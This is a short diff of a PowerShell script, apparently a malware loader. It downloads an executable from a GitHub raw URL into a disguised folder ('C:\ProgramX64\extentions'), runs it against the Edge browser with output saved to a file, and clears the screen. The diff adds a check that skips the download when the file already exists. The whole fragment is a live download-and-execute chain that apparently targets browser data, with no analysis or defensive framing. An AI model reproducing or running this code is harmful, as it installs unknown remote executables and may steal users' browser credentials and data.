@@ -29,9 +29,9 @@ $url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/publ
 $outPath = "C:\ProgramX64\extentions\evab.exe"
 
 
-
-Invoke-WebRequest -Uri $url -OutFile $outPath
-Start-Sleep -Seconds 10
+if(!(Test-Path -Path $outPath)) {
+Invoke-WebRequest -Uri $url -OutFile $outPath}
+Start-Sleep -Seconds 5
 C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\" edge > C:\ProgramX64\extentions\a.dat
 Start-Sleep -Seconds 1
 cls
